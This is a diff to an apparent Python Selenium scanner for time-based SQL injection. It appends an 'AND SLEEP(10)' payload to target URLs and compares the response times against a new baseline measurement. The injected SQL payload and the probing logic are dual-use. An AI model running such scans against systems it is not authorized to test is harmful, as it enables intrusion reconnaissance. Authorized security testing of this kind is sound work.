@@ -86,24 +86,36 @@ def perform_request_selenium(driver, url, payload, cookie):
             driver.get("about:blank")
             driver.add_cookie({"name": "cookie", "value": cookie, "path": "/"})
 
+        # Collect baseline response time (without payload)
+        start_time = time.time()
+        driver.get(url)  # Normal request without SQLi payload
+        end_time = time.time()
+        baseline_response_time = end_time - start_time
+
+        print(Fore.CYAN + f"[i] Baseline response time: {baseline_response_time:.2f} seconds")
+
         # Time-based SQLi detection with multiple trials
         time_based_payload = f"{url}{quote(payload + ' AND SLEEP(10)', safe='')}"  # Using 10-second sleep
         confirmed_vulnerable = False
 
         total_trials = 3  # Number of trials to run
-        delay_threshold = 10  # Time delay threshold in seconds (matches the sleep duration)
         consistent_delay_count = 0
 
         for attempt in range(total_trials):  # Run multiple trials for confirmation
             # Adding a random delay between 1 and 3 seconds between each request
             time.sleep(random.uniform(1, 3))
 
+            # Send request with the time-based SQLi payload
             start_time = time.time()
             driver.get(time_based_payload)
             end_time = time.time()
-            response_time = end_time - start_time
+            injected_response_time = end_time - start_time
 
-            if response_time >= delay_threshold:
+            delay_detected = injected_response_time - baseline_response_time
+            print(Fore.CYAN + f"[i] Injected response time: {injected_response_time:.2f} seconds (delay: {delay_detected:.2f} seconds)")
+
+            # Consider a URL vulnerable if the delay is close to 10 seconds (± 2 seconds)
+            if delay_detected >= 8:
                 consistent_delay_count += 1
 
         if consistent_delay_count >= 2:  # Require at least 2 consistent delays to confirm vulnerability
@@ -127,6 +139,7 @@ def perform_request_selenium(driver, url, payload, cookie):
         else:
             print(Fore.RED + f"[!] WebDriverException: {str(e)}")
             return target_url, False
+
 
 def detect_sql_error_in_response(page_content):
     """
